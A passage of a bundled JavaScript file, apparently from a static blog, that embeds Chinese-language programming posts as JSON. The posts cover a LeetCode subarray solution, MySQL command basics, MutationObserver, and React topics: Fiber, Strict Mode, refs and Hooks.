class=\\"hljs-number\\">0</span>;i&lt;nums.length;i++){\\n    sum+=nums[i]\\n    <span class=\\"hljs-keyword\\">if</span>(i&gt;k<span class=\\"hljs-number\\">-1</span>)sum-=nums[i-k]\\n    <span class=\\"hljs-keyword\\">if</span>(i&gt;=k<span class=\\"hljs-number\\">-1</span>)sums[i-k+<span class=\\"hljs-number\\">1</span>]=sum  \\n  }\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;len;i++){\\n    <span class=\\"hljs-keyword\\">if</span>(sums[i]&gt;sums[maxIndex])maxIndex=i\\n    left[i]=maxIndex\\n  }\\n  maxIndex=len<span class=\\"hljs-number\\">-1</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=len<span class=\\"hljs-number\\">-1</span>;i&gt;=<span class=\\"hljs-number\\">0</span>;i--){\\n   <span class=\\"hljs-keyword\\">if</span>(sums[i]&gt;sums[maxIndex])maxIndex=i\\n    right[i]=maxIndex\\n  }\\n  <span class=\\"hljs-keyword\\">let</span> res=[<span class=\\"hljs-number\\">0</span>,k,<span class=\\"hljs-number\\">2</span>*k]\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=k;i&lt;len;i++){\\n    <span class=\\"hljs-keyword\\">let</span> l=left[i-k],m=i,r=right[i+k]\\n    <span class=\\"hljs-keyword\\">if</span>(sums[l]+sums[m]+sums[r]&gt;sums[res[<span class=\\"hljs-number\\">0</span>]]+sums[res[<span class=\\"hljs-number\\">1</span>]]+sums[res[<span class=\\"hljs-number\\">2</span>]]){\\n      res[<span class=\\"hljs-number\\">0</span>]=l\\n      res[<span class=\\"hljs-number\\">1</span>]=m\\n      res[<span class=\\"hljs-number\\">2</span>]=r\\n    }\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> res\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-26","timeArr":[2018,9,26,0,0,0,0],"title":"LeetCode最大3个不重叠子数组之和","uuid":"761230c6c621098f0a8a2e62ab620dffa59a3460","summary":"<p>一个只包含正数的数组，找三个长度为k的不重叠的子数组，使得所有子数组的数字之和最大。</p>\\n<p>例如：</p>\\n<pre class=\\"hljs\\"><code>Input: [1,2,1,2,6,7,5,1], 2\\nOutput: [0, 3, 5]\\nExplanation: Subarrays [1, 2], [2, 6], [7, 5] correspond to th...</code></pre>","slug":"LeetCode-zui-da-3-ge-bu-chong-die-zi-shu-zu-zhi-he","sha":"abbf38ac11dcc38431445248ada55b000c3406ec"}')},560:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li>给表添加别名(M是movies的别名,T是title的输出名)</li>\\n</ul>\\n<p><code>SELECT title as T  FROM movies M;</code></p>\\n<ul>\\n<li>添加row</li>\\n</ul>\\n<p><code>INSERT  INTO library VALUES (1,&#39;javascript&#39;,8);</code></p>\\n<ul>\\n<li>条件排序order by</li>\\n</ul>\\n<p><code>SELECT *  FROM movies WHERE release_year&gt;1999 ORDER BY  release_year;</code></p>\\n<ul>\\n<li>SUM</li>\\n</ul>\\n<p><code>SELECT SUM(minutes) FROM todo_list;</code></p>\\n<ul>\\n<li>嵌套in</li>\\n</ul>\\n<p><code>SELECT title FROM songs WHERE artist IN (\\n    SELECT name FROM artists WHERE genre=&quot;Pop&quot;);</code></p>\\n<ul>\\n<li>like<pre><code><pre class=\\"hljs\\"><code>SELECT * FROM exercise_logs\\nWHERE type IN (\\n  SELECT type FROM drs_favorites \\n  WHERE reason LIKE &quot;%cardiovascular%&quot;\\n  );</code></pre></code></pre></li>\\n<li>多重条件选择case...when..then<pre><code><pre class=\\"hljs\\"><code>SELECT Count(*),\\n  CASE \\n      WHEN number_grade&gt;90 THEN &quot;A&quot;\\n      WHEN number_grade&gt;80 THEN &quot;B&quot;\\n      WHEN number_grade&gt;70 THEN &quot;C&quot;\\n      ELSE &quot;F&quot;\\n  END AS &quot;letter_grade&quot;\\n  FROM student_grades \\n  GROUP BY letter_grade;</code></pre></code></pre></li>\\n<li>as别名 group by...having<pre><code><pre class=\\"hljs\\"><code>SELECT author ,AVG(words) AS avg_words FROM books \\n  GROUP BY author\\n  HAVING avg_words &gt;150000;\\n</code></pre></code></pre></li>\\n</ul>\\n<pre><code><pre class=\\"hljs\\"><code>\\n* and且</code></pre></code></pre><p>SELECT persons.name,hobbies.name FROM persons\\nJOIN hobbies\\nWHERE persons.name=&#39;Bobby McBobbyFace&#39;\\nAND persons.id=hobbies.person_id;</p>\\n<pre><code><pre class=\\"hljs\\"><code>\\n* not in(A.id不存在于B.CustomerId中的数据)</code></pre></code></pre><p>SELECT Name from Customers A\\nWHERE A.Id NOT IN (SELECT B.CustomerId from Orders B)</p>\\n<pre><code><pre class=\\"hljs\\"><code>\\n* not exist</code></pre></code></pre><p>SELECT A.Name from Customers A\\nWHERE NOT EXISTS (SELECT 1 FROM Orders B WHERE A.Id = B.CustomerId)</p>\\n<pre><code><pre class=\\"hljs\\"><code>\\n* left out join...on合并表并且左边全部合并显示</code></pre></code></pre><p>SELECT customers.name, customers.email, SUM(orders.price) AS total_price\\nFROM customers \\nLEFT OUTER JOIN orders\\nON orders.customer_id=customers.id\\nGROUP BY customers.id\\nORDER BY total_price desc;</p>\\n<pre><code><pre class=\\"hljs\\"><code>* 合并当前表 left outer join xxx 别名</code></pre></code></pre><p>/* join itself */\\nSELECT movies.title, sequel.title AS sequel_title\\nFROM movies\\nLEFT OUTER JOIN movies sequel\\nON movies.sequel_id=sequel.id;</p>\\n<pre><code><pre class=\\"hljs\\"><code>* 多重合并</code></pre></code></pre><p>/* multiple joins*/\\nSELECT a.fullname, b.fullname FROM friends\\nJOIN persons a\\nON a.id=friends.person1_id\\nJOIN persons b\\nON b.id=friends.person2_id;</p>\\n<pre><code><pre class=\\"hljs\\"><code>* 更新内容update</code></pre></code></pre><p>UPDATE documents SET author=&#39;Jackie Draper&#39;\\nWHERE author=&#39;Jackie Paper&#39;;</p>\\n<pre><code><pre class=\\"hljs\\"><code>* 删除内容\\n\\n`DELETE FROM documents WHERE title=&quot;Things I\'m Afraid Of&quot;;`\\n\\n* 增加表的列，改变表结构\\n\\n`ALTER TABLE clothes ADD COLUMN price INTEGER;`\\n\\n* 变更表名\\n\\n`ALTER TABLE travel_spots RENAME TO places_to_live;`</code></pre></code></pre>","toc":[],"relatedTags":null,"created_at":"2018-09-04","timeArr":[2018,8,4,0,0,0,0],"title":"MYSQL常用命令记录","uuid":"b3f75a48780077e930c5409efefb6e27050a2057","summary":"<ul>\\n<li>给表添加别名(M是movies的别名,T是title的输出名)</li>\\n</ul>\\n<p><code>SELECT title as T  FROM movies M;</code></p>\\n<ul>\\n<li>添加row</li>\\n</ul>\\n<p><code>INSERT  INTO library VALUES (1,\'javascript\',8);</code></p>\\n<ul>\\n<li>条件排序order by</li>\\n</ul>\\n<p>`SELECT *  F...</p>","slug":"MYSQL-chang-yong-ming-ling-ji-lu","sha":"876bcd03410d0865b98212677e8ea1297deefb8a"}')},561:function(n){n.exports=JSON.parse('{"content":"<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> observer=<span class=\\"hljs-keyword\\">new</span> MutationObserver(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">records</span>)</span>{\\n  <span class=\\"hljs-comment\\">// 获取变化的DOM的一些属性 </span>\\n  records.API1\\n})</code></pre></code></pre>\\n<p>API1：</p>\\n<pre><code><pre class=\\"hljs\\"><code>API1={\\ntype：观察的变动类型（attribute、characterData或者childList）。\\ntarget：发生变动的DOM节点。\\naddedNodes：新增的DOM节点。\\nremovedNodes：删除的DOM节点。\\npreviousSibling：前一个同级节点，如果没有则返回null。\\nnextSibling：下一个同级节点，如果没有则返回null。\\nattributeName：发生变动的属性。如果设置了attributeFilter，则只返回预先指定的属性。\\noldValue：变动前的值。这个属性只对attribute和characterData变动有效，如果发生childList变动，则返回null。\\n}</code></pre></code></pre><p> 启动监听：</p>\\n<p><code>observer.observe(element,options)</code></p>\\n<pre><code><pre class=\\"hljs\\"><code>options={\\nchildList：子节点的变动（指新增，删除或者更改）,\\nattributes：属性的变动,\\ncharacterData：节点内容或节点文本的变动,\\nsubtree：布尔值，表示是否将该观察器应用于该节点的所有后代节点,\\nattributeOldValue：布尔值，表示观察attributes变动时，是否需要记录变动前的属性值,\\ncharacterDataOldValue：布尔值，表示观察characterData变动时，是否需要记录变动前的值,\\nattributeFilter：数组，表示需要观察的特定属性（比如[\'class\',\'src\']）\\n}</code></pre></code></pre><p>参考：<a href=\\"http://javascript.ruanyifeng.com/dom/mutationobserver.html#toc1\\">http://javascript.ruanyifeng.com/dom/mutationobserver.html#toc1</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-29","timeArr":[2018,7,29,0,0,0,0],"title":"MutationObserver对象","uuid":"e3b94840e980e8848b479296e62a83d39630ab76","summary":"<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> observer=<span class=\\"hljs-keyword\\">new</span> MutationObserver(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">records</span>)</span>{\\n  <span class=\\"hljs-comment\\">// 获取变化的DOM的一些属性 </span>\\n  records.API1\\n})\\n</code></pre>\\n<p>API1：</p>\\n<pre class=\\"hljs\\"><code>API1={\\ntype：观察的变动类型（attribute、characterData或者chil...</code></pre>","slug":"MutationObserver-dui-xiang","sha":"8540f01502cc34ee1bdc412b3483427e52a8e911"}')},562:function(n){n.exports=JSON.parse('{"content":"<p>这是看了两篇文章后个人的一些总结和理解，如果有误，还请指出！</p>\\n<blockquote>\\n<p><code>Fiber</code>可以看成一种数据结构，它内部包含了对当前组件的行为，包括对组件行为的跟踪、安排、暂停和取消。</p>\\n</blockquote>\\n<h3 id=\\"fiber-de-jie-gou\\">Fiber的结构</h3>\\n<p><code>React</code>的组件对象每次<code>render</code>的时候都会重新创建</p>\\n<p><code>React</code>组件对象如下：</p>\\n<pre><code><pre class=\\"hljs\\"><code>{\\n    $$typeof: Symbol(react.element),\\n    type: \'button\',\\n    key: &quot;1&quot;,\\n    props: {\\n        children: \'Update counter\',\\n        onClick: () =&gt; { ... }\\n    }\\n}</code></pre></code></pre><p>而<code>Fiber</code>并不会每次创建，而是直接在原内容上修改。</p>\\n<p>每个组件都有一个<code>Fiber</code>结构，它们共同组成了树，而它们互相连接通过<code>child</code>,<code>sibling</code>,<code>return</code>(相当于parent)。</p>\\n<pre><code><pre class=\\"hljs\\"><code>  return\\n    |\\n  FiberNode --sibling\\n    |\\n  child</code></pre></code></pre><h3 id=\\"fiber-nei-bu-gong-zuo-fang-shi\\">Fiber内部工作方式</h3>\\n<p><code>Fiber</code>展示给用户的界面的的树称为<code>current</code>树，内部还有一个<code>workInProgress</code>树，它们二者互相通过属性<code>alternate</code>引用对方。</p>\\n<p>当组件内部执行<code>redner</code>阶段更新时，都是在<code>workInProgress</code>内部进行；</p>\\n<p>在<code>commit</code>阶段，<code>workInProgress</code>树变为<code>current</code>树，<code>current</code>树变为<code>workInProgress</code>树。</p>\\n<h3 id=\\"fiber-de-render-jie-duan-he-commit-jie-duan\\">Fiber的render阶段和commit阶段</h3>\\n<ul>\\n<li><p>render阶段</p>\\n<p>  <code>render</code>是异步执行，可阻断，执行效果对用户不可见。</p>\\n<p>  执行方式是通过4个方法去遍历一棵树(<code>virtual stack</code>)：</p>\\n<ul>\\n<li><p>performUnitOfWork</p>\\n</li>\\n<li><p>beginWork</p>\\n</li>\\n<li><p>completeUnitOfWork</p>\\n</li>\\n<li><p>completeWork</p>\\n<p>如下gif</p>\\n<p><img src=\\"/article/img/fiber-render-phase.gif\\" alt=\\"\\"></p>\\n<p><code>render</code>阶段是在<code>workInProgress</code>树中执行，通过<code>nextEffect</code>属性将每个执行更新的组件连接。</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>commit阶段</p>\\n<p>  <code>commit</code>是同步执行更新阶段，不可阻断，执行效果对用户可见。</p>\\n<p>  通过<code>nextEffect</code>线性执行<code>commit</code>更新。</p>\\n</li>\\n</ul>\\n<h3 id=\\"fiber-nei-bu-de-loop，react-shi-xian-fei-zu-se-render-de-ao-mi\\"><code>Fiber</code>内部的loop，<code>React</code>实现非阻塞<code>render</code>的奥秘</h3>\\n<p><code>React</code>多个交互组件组成了一棵树，每次执行<code>render</code>的时候，需要去遍历这棵树判断哪个组件需要更新。</p>\\n<p>遍历一棵树，可能我们的第一想法就是递归，的确递归简洁明了，但是有一个缺陷，一旦它沿着栈执行，那必须将栈执行到结束。\\n在这之前，无法去检测是否有优先级更高的任务。</p>\\n<p>因此，<code>React</code>为了保证非阻塞更新，它不能使用递归的方法遍历，它需要在每个组件<code>render</code>阶段执行完毕的同时，去查看是否有优先级更高的任务。</p>\\n<p>这里是通过<code>requestIdleCallback</code>中的<code>deadline.timeRemaining()</code>检测，<code>deadline.timeRemaining()</code>表示在浏览器下一帧执行之前，当前帧的剩余时间。</p>\\n<p>每个组件<code>render</code>阶段完成后，如果检测到还有剩余时间，则继续下一个组件的<code>render</code>。</p>\\n<p>那么<code>React</code>怎么样才能在一棵树内部遍历，并且每次都清空栈，检查剩余时间？</p>\\n<p>它使用了一种叫做<code>virtual stack</code>(虚拟栈)，一个while循环。</p>\\n<p>它的实现依赖了<code>Fiber</code>结构的<code>return</code>属性，确保能正确回到当前调用组件的上一层。</p>\\n<p>通过<code>virtual stack</code>，能够实现递归的执行顺序并且没有栈的堆叠。</p>\\n<p>实现类似如下：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">walk</span>(<span class=\\"hljs-params\\">o</span>) </span>{\\n  <span class=\\"hljs-keyword\\">let</span> root = o;\\n  <span class=\\"hljs-keyword\\">let</span> current = o;\\n\\n  <span class=\\"hljs-keyword\\">while</span> (<span class=\\"hljs-literal\\">true</span>) {\\n    <span class=\\"hljs-keyword\\">let</span> child = doRenderWork(current);\\n    <span class=\\"hljs-comment\\">// 发现子组件，重复执行，这里没有栈(模拟入栈)</span>\\n    <span class=\\"hljs-keyword\\">if</span> (child) {\\n      current = child;\\n      <span class=\\"hljs-keyword\\">continue</span>;\\n    }\\n    <span class=\\"hljs-comment\\">// 发现已经到达起点，退出</span>\\n    <span class=\\"hljs-keyword\\">if</span> (current === root) {\\n      <span class=\\"hljs-keyword\\">return</span>;\\n    }\\n    <span class=\\"hljs-comment\\">// 当无child，并且无sibling，通过return返回上一层(模拟出栈)</span>\\n    <span class=\\"hljs-keyword\\">while</span> (!current.sibling) {\\n      <span class=\\"hljs-comment\\">// 到达原始点或者无法return，退出</span>\\n      <span class=\\"hljs-keyword\\">if</span> (!current.return || current.return === root) {\\n        <span class=\\"hljs-keyword\\">return</span>;\\n      }\\n      <span class=\\"hljs-comment\\">// set the parent as the current active node</span>\\n      current = current.return;\\n    }\\n    <span class=\\"hljs-comment\\">// 存在sibling，进入sibling</span>\\n    current = current.sibling;\\n  }\\n}</code></pre></code></pre>\\n<h3 id=\\"fiber-de-effectlist\\"><code>Fiber</code>的<code>EffectList</code></h3>\\n<p>当一棵组件树内部有多个组件需要更新，<code>Fiber</code>在<code>render</code>阶段通过<code>virtual stack</code>的方式去标记出需要渲染的组件，\\n记录到<code>EffectList</code>中。</p>\\n<p><code>React</code>的<code>commit</code>阶段通过<code>nextEffect</code>对<code>EffectList</code>的组件进行线性处理(渲染)，而不是在一棵树内部再次遍历。</p>\\n<p>其中<code>firstEffect</code>属性标记了从哪个组件开始更新，然后不断执行<code>nextEffect</code>对应的组件的更新。</p>\\n<h3 id=\\"can-kao\\">参考</h3>\\n<ul>\\n<li><a href=\\"https://medium.com/react-in-depth/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react-e1c04700ef6e\\">https://medium.com/react-in-depth/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react-e1c04700ef6e</a></li>\\n<li><a href=\\"https://medium.com/dailyjs/the-how-and-why-on-reacts-usage-of-linked-list-in-fiber-67f1014d0eb7\\">https://medium.com/dailyjs/the-how-and-why-on-reacts-usage-of-linked-list-in-fiber-67f1014d0eb7</a></li>\\n</ul>\\n","toc":[{"anchor":"fiber-de-jie-gou","level":3,"text":"Fiber的结构"},{"anchor":"fiber-nei-bu-gong-zuo-fang-shi","level":3,"text":"Fiber内部工作方式"},{"anchor":"fiber-de-render-jie-duan-he-commit-jie-duan","level":3,"text":"Fiber的render阶段和commit阶段"},{"anchor":"fiber-nei-bu-de-loop，react-shi-xian-fei-zu-se-render-de-ao-mi","level":3,"text":"<code>Fiber</code>内部的loop，<code>React</code>实现非阻塞<code>render</code>的奥秘"},{"anchor":"fiber-de-effectlist","level":3,"text":"<code>Fiber</code>的<code>EffectList</code>"},{"anchor":"can-kao","level":3,"text":"参考"}],"relatedTags":null,"created_at":"2018-11-28","timeArr":[2018,10,28,0,0,0,0],"title":"React-Fiber简述","uuid":"b1f5ca61aa11b54e8e854bd3c67096d01428d37b","summary":"<p><code>Fiber</code>可以看成一种数据结构，它内部包含了对当前组件的行为，包括对组件行为的跟踪、安排、暂停和取消。</p>","slug":"React-Fiber-jian-shu","sha":"0577a959c7299927efbe8e15eb104f1a45ad84ee"}')},563:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"strict-mode\\">Strict Mode</h4>\\n<p>在React v16.3时添加，目的是帮助找出应用中潜在的问题。</p>\\n<p>使用：</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> React <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'react\'</span>;\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">ExampleApplication</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> (\\n    &lt;div&gt;\\n      &lt;Header /&gt;\\n      &lt;React.StrictMode&gt;\\n        &lt;div&gt;\\n          &lt;ComponentOne /&gt;\\n          &lt;ComponentTwo /&gt;\\n        &lt;/div&gt;\\n      &lt;/React.StrictMode&gt;\\n      &lt;Footer /&gt;\\n    &lt;/div&gt;\\n  );\\n}</code></pre></code></pre>\\n<hr>\\n<p>简单总结：</p>\\n<p>StrictMode目前有助于</p>\\n<ul>\\n<li>识别具有不安全生命周期的组件</li>\\n<li>有关旧式字符串<code>ref</code>用法的警告</li>\\n<li>有关<code>findDOMNode</code>使用的警告</li>\\n<li>检测意外的副作用</li>\\n<li>检测是否有旧的<code>context</code>API</li>\\n</ul>\\n<ol>\\n<li><p>识别具有不安全生命周期的组件</p>\\n<p> 检测是否使用已经列入废弃的生命周期(检测第三方工具很方便)。</p>\\n</li>\\n<li><p>有关旧式字符串<code>ref</code>用法的警告</p>\\n<p> <code>ref</code>字符串虽然方便，但有许多<a href=\\"https://github.com/facebook/react/issues/1373\\">缺陷</a></p>\\n<p> 检测是否使用了<code>ref</code>字符串。</p>\\n</li>\\n<li><p>有关<code>findDOMNode</code>使用的警告</p>\\n<p> 如果需要获取DOM元素引用，优先使用ref，而不是<code>findDOMNode</code>。</p>\\n<p> 第一、因为当使用了<Fragment>的时候，<code>findDOMNode</code>只会引用到第一个元素，而当时渲染的元素可能有很多。</p>\\n<p> 第二、<code>findDOMNode</code>是一个一次性的调用，当渲染元素改变，它(之前的结果)并不会改变。</p>\\n</li>\\n<li><p>检测意外的副作用</p>\\n<p> React更新会经过2个阶段</p>\\n<ul>\\n<li><p><code>render</code> 这个阶段会决定哪些需要更新。</p>\\n</li>\\n<li><p><code>commit</code> 这个阶段会执行更新。</p>\\n<p>其中<code>render</code>阶段很慢(相对)，因此未来的<code>async mode</code>会将<code>render</code>阶段分割成许多小块。</p>\\n<p>因此在<code>render</code>阶段的生命周期函数有可能会重复执行。</p>\\n<p>而这个检测功能，会有意进行双调用，如果<code>render</code>阶段不是一致的结果，则有可能更容易发现bug。</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>检测是否有旧的<code>context</code>API</p>\\n<p> 旧的<code>context</code>API更容易出现bug。</p>\\n</li>\\n</ol>\\n","toc":[{"anchor":"strict-mode","level":4,"text":"Strict Mode"}],"relatedTags":null,"created_at":"2018-10-30","timeArr":[2018,9,30,0,0,0,0],"title":"React的Strict Mode","uuid":"8cf3eb3203db34468cc1b1507b0c244e16cbf3ab","summary":"<h4>Strict Mode</h4>\\n<p>在React v16.3时添加，目的是帮助找出应用中潜在的问题。</p>\\n<p>使用：</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> React <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'react\'</span>;\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">ExampleApplication</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> (\\n    &lt;div&gt;\\n      &lt;Header /&gt;...</code></pre>","slug":"React-de-Strict-Mode","sha":"041680b86309bc84db432c597afbaf572d179c1f"}')},564:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"createref\\">createRef</h3>\\n<p>当 ref 属性在组件时，获取组件实例；当ref属性在dom时，获取dom实例</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">MyComponent</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(props) {\\n    <span class=\\"hljs-keyword\\">super</span>(props);\\n\\n    <span class=\\"hljs-keyword\\">this</span>.inputRef = React.createRef();\\n  }\\n\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> &lt;input type=\\"text\\" ref={this.inputRef} /&gt;;\\n  }\\n\\n  componentDidMount() {\\n    <span class=\\"hljs-keyword\\">this</span>.inputRef.current.focus();\\n  }\\n}</code></pre></code></pre>\\n<h3 id=\\"finddomnode\\">findDOMNode</h3>\\n<p>获取findDOMNode(this)参数组件(this)的DOM（所有DOM）</p>\\n<p>如果只是Fragment包裹，则只能获取其第一个子组件的DOM</p>\\n<p>例如：</p>\\n<p>获取的第一个子组件的DOM：<code>&lt;div&gt;1&lt;/div&gt;</code></p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>&lt;Fragment&gt;\\n    &lt;div&gt;1&lt;/div&gt;\\n    &lt;div&gt;2&lt;/div&gt;\\n&lt;<span class=\\"hljs-regexp\\">/Fragment&gt;</span></code></pre></code></pre>\\n<p>获取的第一个子组件的DOM：<code>&lt;div&gt;&lt;div&gt;1&lt;/div&gt;&lt;div&gt;2&lt;/div&gt;&lt;/div&gt;</code></p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>&lt;Fragment&gt;\\n    &lt;div&gt;\\n        &lt;div&gt;1&lt;/div&gt;\\n        &lt;div&gt;2&lt;/div&gt;\\n    &lt;/div&gt;\\n&lt;<span class=\\"hljs-regexp\\">/Fragment&gt;</span></code></pre></code></pre>\\n<h3 id=\\"forwardref\\">forwardRef</h3>\\n<p>用法：</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> Child=React.forwardRef(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">props,ref</span>)=&gt;</span>(\\n    &lt;div&gt;\\n        &lt;span ref={ref}&gt;child&lt;/span&gt;\\n    &lt;/div&gt;\\n))</code></pre></code></pre>\\n<p>通过上面包裹后，</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">Parent</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span></span>{\\n    <span class=\\"hljs-comment\\">//...</span>\\n\\n    <span class=\\"hljs-keyword\\">this</span>.myRef=React.createRef();\\n\\n    &lt;Child ref={this.myRef} /&gt;\\n}</code></pre></code></pre>\\n<p>虽然ref在组件上，但还是能获取到Child的span.</p>\\n<p>另一种用法：获取的是input</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> Child= React.forwardRef(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">props,ref</span>)=&gt;</span>{\\n    <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">GrandChild</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span></span>{\\n        render(){\\n            <span class=\\"hljs-keyword\\">return</span> (\\n                &lt;input ref={ref}/&gt;\\n            )\\n        }\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> (\\n        &lt;div &gt;\\n            child\\n            {props.children}\\n            &lt;GrandChild /&gt;\\n        &lt;/div&gt;\\n    )\\n})\\n</code></pre></code></pre>\\n","toc":[{"anchor":"createref","level":3,"text":"createRef"},{"anchor":"finddomnode","level":3,"text":"findDOMNode"},{"anchor":"forwardref","level":3,"text":"forwardRef"}],"relatedTags":null,"created_at":"2018-06-08","timeArr":[2018,5,8,0,0,0,0],"title":"React获取DOM","uuid":"8fb9804dd71b929b0e5256563c63f9d6c48d95b2","summary":"<h4>createRef</h4>\\n<p>当 ref 属性在组件时，获取组件实例；当ref属性在dom时，获取dom实例</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">MyComponent</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(props) {\\n    <span class=\\"hljs-keyword\\">super</span>(props);\\n\\n    <span class=\\"hljs-keyword\\">this</span>.inp...</code></pre>","slug":"React-huo-qu-DOM","sha":"584a1de3b3d076a60c2ae132c0b6ae9e4451ad42"}')},565:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"hooks\\">Hooks</h4>\\n<p><code>useState, useEffect, useContext</code></p>\\n<hr>\\n<ul>\\n<li>useState:</li>\\n</ul>\\n<ol>\\n<li><p>可以在非class使用state</p>\\n</li>\\n<li><p>返回一个数组</p>\\n<p> arr[0]是具体的state</p>\\n<p> arr[1]是改变state的方法</p>\\n<p> <code>const [count, setCount] = useState(initialCount);</code></p>\\n</li>\\n<li><p>不像this.setState，useState不能合并state，例如</p>\\n<p> <code>state={x:1,y:2}  set({x:3}) ===&gt; state={x:3}</code></p>\\n<p> <code>state={x:1,y:2} this.setState({x:3})===&gt;state={x:3,y:2}</code></p>\\n</li>\\n<li><p>初始化只会执行一次，因此一些昂贵的操作应该放到初始化执行，例如：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">const</span> [state, setState] = useState(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n   <span class=\\"hljs-keyword\\">const</span> initialState = someExpensiveComputation(props);\\n   <span class=\\"hljs-keyword\\">return</span> initialState;\\n });</code></pre></code></pre>\\n</li>\\n</ol>\\n<hr>\\n<ul>\\n<li>useEffect:</li>\\n</ul>\\n<p>函数式组件主体都是挂载在render，使用副作用操作会有一些意外bug发生。</p>\\n<p>但可以在useEffect内部执行，这个钩子在render之后才执行。</p>\\n<ol>\\n<li><p>useEffect的返回值会在unmount之前执行</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> useEffect(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n   <span class=\\"hljs-keyword\\">const</span> subscription = props.source.subscribe();\\n   <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n     <span class=\\"hljs-comment\\">// Clean up the subscription</span>\\n     subscription.unsubscribe();\\n   };\\n });</code></pre></code></pre>\\n</li>\\n<li><p>useEffect第二个参数(array)，规定的数据发生变化才会执行</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> useEffect(\\n   <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n     <span class=\\"hljs-keyword\\">const</span> subscription = props.source.subscribe();\\n     <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n       subscription.unsubscribe();\\n     };\\n   },\\n   [props.source],\\n );</code></pre></code></pre>\\n</li>\\n</ol>\\n<hr>\\n<ul>\\n<li>useContext:</li>\\n</ul>\\n<p>和<code>static contextType</code>很像</p>\\n<p><code>const context = useContext(Context);</code></p>\\n<p>一行代码代替了</p>\\n<pre><code><pre class=\\"hljs\\"><code>&lt;Context.Provider&gt;\\n&lt;Context.Consumer&gt;</code></pre></code></pre>","toc":[{"anchor":"hooks","level":4,"text":"Hooks"}],"relatedTags":null,"created_at":"2018-10-29","timeArr":[2018,9,29,0,0,0,0],"title":"React v16.7 Hooks(1)","uuid":"f38c0d6abc75ce713d9bcd733aa66d5097d25e56","summary":"<h4>Hooks</h4>\\n<p><code>useState, useEffect, 